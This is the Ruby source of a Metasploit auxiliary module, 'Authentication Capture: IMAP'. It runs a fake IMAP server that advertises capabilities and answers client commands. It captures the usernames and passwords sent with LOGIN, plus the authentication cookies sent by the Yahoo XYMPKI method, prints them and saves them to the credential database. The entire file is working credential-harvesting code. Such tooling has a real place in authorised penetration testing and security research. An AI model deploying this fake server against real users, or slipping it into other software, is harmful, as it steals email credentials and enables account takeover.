##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name' => 'Authentication Capture: IMAP',
      'Description' => %q{
        This module provides a fake IMAP service that
      is designed to capture authentication credentials.
      },
      'Author' => ['ddz', 'hdm'],
      'License' => MSF_LICENSE,
      'Actions' => [
        [ 'Capture', { 'Description' => 'Run IMAP capture server' } ]
      ],
      'PassiveActions' => [
        'Capture'
      ],
      'DefaultAction' => 'Capture',
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [],
        'Reliability' => []
      }
    )

    register_options(
      [
        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 143 ]),
        OptString.new('BANNER', [ true, 'The server banner', 'IMAP4'])
      ]
    )
  end

  def setup
    super
    @state = {}
  end

  def run
    exploit
  end

  def on_client_connect(client)
    @state[client] = { name: "#{client.peerhost}:#{client.peerport}", ip: client.peerhost, port: client.peerport, user: nil, pass: nil }
    client.put "* OK #{datastore['BANNER']}\r\n"
  end

  def on_client_data(client)
    data = client.get_once
    return unless data

    num, cmd, arg = data.strip.split(/\s+/, 3)
    cmd ||= ''
    arg ||= ''
    args = []

    # If the argument is a number in braces, such as {3}, it means data is coming
    # separately
    if arg.chomp =~ /\{[0-9]+\}$/
      loop do
        # Ask for more data
        client.put "+ \r\n"

        # Get the next line
        arg = (client.get_once || '').chomp

        # Remove the length field, if there is one
        if arg =~ /(.*) \{[0-9]+\}$/
          args << ::Regexp.last_match(1)
        else
          # If there's no length field, we're at the end
          args << arg
          break
        end
      end
    else
      # If there's no length, treat it like we used to
      args = arg.split(/\s+/)
    end

    if cmd.upcase == 'CAPABILITY'
      client.put '* CAPABILITY IMAP4 IMAP4rev1 IDLE LOGIN-REFERRALS ' \
            'MAILBOX-REFERRALS NAMESPACE LITERAL+ UIDPLUS CHILDREN UNSELECT ' \
            'QUOTA XLIST XYZZY LOGIN-REFERRALS AUTH=XYMCOOKIE AUTH=XYMCOOKIEB64 ' \
            "AUTH=XYMPKI AUTH=XYMECOOKIE ID\r\n"
      client.put "#{num} OK CAPABILITY completed.\r\n"
    end

    # Handle attempt to authenticate using Yahoo's magic cookie
    # Used by iPhones and Zimbra
    if cmd.upcase == 'AUTHENTICATE' && arg.upcase == 'XYMPKI'
      client.put "+ \r\n"
      cookie1 = client.get_once
      client.put "+ \r\n"
      cookie2 = client.get_once
      register_creds(@state[client][:ip], cookie1, cookie2, 'imap-yahoo')
      return
    end

    if cmd.upcase == 'LOGIN'
      @state[client][:user], @state[client][:pass] = args
      register_creds(@state[client][:ip], @state[client][:user], @state[client][:pass], 'imap')
      print_good("IMAP LOGIN #{@state[client][:name]} #{@state[client][:user]} / #{@state[client][:pass]}")

      return
    end

    if cmd.upcase == 'LOGOUT'
      client.put("* BYE IMAP4rev1 Server logging out\r\n")
      client.put("#{num} OK LOGOUT completed\r\n")
      return
    end

    if cmd.upcase == 'ID'
      # RFC2971 specifies the ID command, and `NIL` is a valid response
      client.put("* ID NIL\r\n")
      client.put("#{num} OK ID completed\r\n")
      return
    end

    @state[client][:pass] = data.strip
    client.put "#{num} NO LOGIN FAILURE\r\n"
    return
  end

  def on_client_close(client)
    @state.delete(client)
  end

  def register_creds(client_ip, user, pass, service_name)
    # Build service information
    service_data = {
      address: client_ip,
      port: datastore['SRVPORT'],
      service_name: service_name,
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    # Build credential information
    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      private_data: pass,
      private_type: :password,
      username: user,
      workspace_id: myworkspace_id
    }

    credential_data.merge!(service_data)
    credential_core = create_credential(credential_data)

    # Assemble the options hash for creating the Metasploit::Credential::Login object
    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED,
      workspace_id: myworkspace_id
    }

    login_data.merge!(service_data)
    create_credential_login(login_data)
  end
end
